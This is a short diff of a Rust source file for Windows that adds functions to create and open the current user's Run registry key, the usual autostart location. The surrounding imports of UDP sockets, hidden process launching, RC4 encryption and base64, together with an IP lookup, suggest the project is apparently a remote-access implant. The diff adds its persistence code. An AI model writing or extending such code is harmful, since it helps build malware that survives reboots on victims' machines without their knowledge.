@@ -1,8 +1,9 @@
 
-use std::{net::UdpSocket, process::Command, os::windows::process::CommandExt, io::{BufReader, BufRead}, path::PathBuf};
+use std::{net::UdpSocket, process::Command, os::windows::process::CommandExt, io::{BufReader, BufRead, self}, path::PathBuf};
 
 use crypto::{md5::Md5, digest::Digest, rc4::Rc4, symmetriccipher::SynchronousStreamCipher};
 use base64::{encode, decode};
+use winreg::{RegKey, enums::{HKEY_CURRENT_USER, RegDisposition}};
 
 pub fn get_exepath() -> PathBuf {
     std::env::current_exe().unwrap()
@@ -12,6 +13,18 @@ pub fn get_path() -> PathBuf {
     let mut exe_path = get_exepath();
     exe_path.pop();
     return exe_path;
+}
+
+pub fn hklm_createkey() -> io::Result<(RegKey, RegDisposition)>{
+    let key_name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    let hklm = RegKey::predef(HKEY_CURRENT_USER);
+    return hklm.create_subkey(key_name);
+}
+
+pub fn hklm_openkey() -> io::Result<RegKey>{
+    let key_name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    let hklm = RegKey::predef(HKEY_CURRENT_USER);
+    return hklm.open_subkey(key_name);
 }
 
 pub fn get_ip() -> Option<String> {
